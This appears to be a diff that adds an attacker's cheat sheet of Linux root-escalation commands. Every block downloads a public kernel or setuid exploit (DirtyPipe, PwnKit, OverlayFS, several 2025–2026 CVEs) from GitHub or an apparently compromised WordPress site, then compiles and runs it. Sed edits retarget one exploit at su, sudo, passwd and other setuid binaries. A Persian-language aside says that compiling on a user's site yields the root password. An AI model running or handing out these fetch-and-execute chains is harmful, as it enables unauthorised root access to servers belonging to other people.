@@ -1,0 +1,107 @@
+wget -O copyfail.py https://raw.githubusercontent.com/SeanRickerd/cve-2026-31431/main/exploit.py
+python3 copyfail.py
+
+cp copyfail.py copyfail_su.py
+sed -i 's|/usr/bin/su|/bin/su|g' copyfail_su.py
+python3 copyfail_su.py
+
+
+cp copyfail.py copyfail_sudo.py
+sed -i 's|/usr/bin/su|/bin/sudo|g' copyfail_sudo.py
+python3 copyfail_sudo.py
+
+cp copyfail.py copyfail_sudo.py
+sed -i 's|/usr/bin/su|/usr/bin/sudo|g' copyfail_sudo.py
+python3 copyfail_sudo.py
+
+cp copyfail.py copyfail_gpasswd.py
+sed -i 's|/usr/bin/su|/usr/bin/gpasswd|g' copyfail_gpasswd.py
+python3 copyfail_gpasswd.py
+/usr/bin/gpasswd root
+
+cp copyfail.py copyfail_mount.py
+sed -i 's|/usr/bin/su|/usr/bin/mount|g' copyfail_mount.py
+python3 copyfail_mount.py
+/usr/bin/mount
+
+cp copyfail.py copyfail_mount.py
+sed -i 's|/usr/bin/su|/bin/mount|g' copyfail_mount.py
+python3 copyfail_mount.py
+/bin/mount
+
+cp copyfail.py copyfail_passwd.py
+sed -i 's|/usr/bin/su|/usr/bin/passwd|g' copyfail_passwd.py
+python3 copyfail_passwd.py
+/usr/bin/passwd root
+
+
+cp copyfail.py copyfail_newgrp.py
+sed -i 's|/usr/bin/su|/bin/newgrp|g' copyfail_newgrp.py
+python3 copyfail_newgrp.py
+/bin/newgrp root
+
+cp copyfail.py copyfail_newgrp.py
+sed -i 's|/usr/bin/su|/usr/bin/newgrp|g' copyfail_newgrp.py
+python3 copyfail_newgrp.py
+usr/bin/newgrp root
+
+wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -O overlay.c
+gcc overlay.c -o overlay
+./overlay
+
+wget https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -O gameover.sh
+chmod +x gameover.sh
+./gameover.sh
+
+========dirtyclone
+wget -O dc.c https://raw.githubusercontent.com/0xBlackash/CVE-2026-43503/refs/heads/main/CVE-2026-43503.c
+gcc -O0 -Wall -static -o dc dc.c -lutil
+./dc
+====test >
+wget -O 64600.sh https://raw.githubusercontent.com/0xBlackash/CVE-2026-64600/refs/heads/main/CVE-2026-64600.sh
+chmod +x 64600.sh
+./64600.sh
+========script 
+wget https://raw.githubusercontent.com/litosmartin/CVE-2026-64600-Refluxfs-PoC/refs/heads/main/refluxfs.c
+gcc refluxfs.c -o refluxfs -lpthread
+./refluxfs
+------to in gall compile bayed user site ro bazari hamoni hast ke password root ro bar midair 
+---------------
+git clone https://github.com/MaherAzzouzi/vsockdrop
+cd vsockdrop
+make
+./exploit
+--inm gaviye
+git clone https://github.com/v12-security/pocs.git && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp
+
+git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+
+=======
+wget https://betelgoldap.pl/wp-content/themes/faith-theme/languages/LEVIATHAN/haxorcgiapi/PwnKit
+chmod +x PwnKit
+./PwnKit
+
+=====
+wget https://github.com/Delphos-Labs/disclosures/raw/main/DirtyCBC/poc.py
+Python3 poc.py
+=====
+
+wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/master/exploit.c -O dirtypipe.c
+gcc dirtypipe.c -o dirty -pthread -lcrypt
+./dirty
+
+curl -L -o dp.py https://raw.githubusercontent.com/crusoe112/DirtyPipePython/main/dirty.py
+python3 dp.py
+
+======
+wget https://raw.githubusercontent.com/MadExploits/CVE-2025-40271/refs/heads/main/exploit.sh
+chmod +x exploit.sh
+./exploit.sh
+
+
+
+wget https://raw.githubusercontent.com/MadExploits/CVE-2025-40271/refs/heads/main/exploit.c
+gcc -o exploit exploit.c -lpthread
+./exploit
+
+=====
